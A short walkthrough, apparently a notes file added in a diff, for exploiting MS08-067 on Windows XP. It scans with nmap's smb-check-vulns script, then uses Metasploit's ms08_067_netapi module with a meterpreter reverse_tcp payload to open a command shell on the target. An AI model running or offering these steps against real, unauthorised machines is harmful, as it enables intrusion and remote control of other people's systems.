@@ -1,0 +1,26 @@
+Using msfconsole & nmap, a vulerable Windows XP machine can be exploited using the ms08_067 exploit.
+
+First, run nmap with whatever flags you would and with the --script=smb-check-vulns flag.
+
+Second, if nmap reports the target as using XP and that it's vulnerable, fire up msfconsole and do the following:
+
+msf > use windows/smb/ms08_067_netapi
+msf > set payload windows/meterpreter/reverse_tcp
+
+Then, set the options generated from "show options", and the target generated from "show targets".
+
+msf > exploit
+
+If the exploitation succeeds, do the following:
+
+msf > sessions -l
+
+This will list all the sessions connected to your machine.
+
+msf > sessions -i [sessionNum]
+
+This will connect to a chosen session.
+
+msf > shell
+
+This will launch a CMD session on the target, giving access to the system.
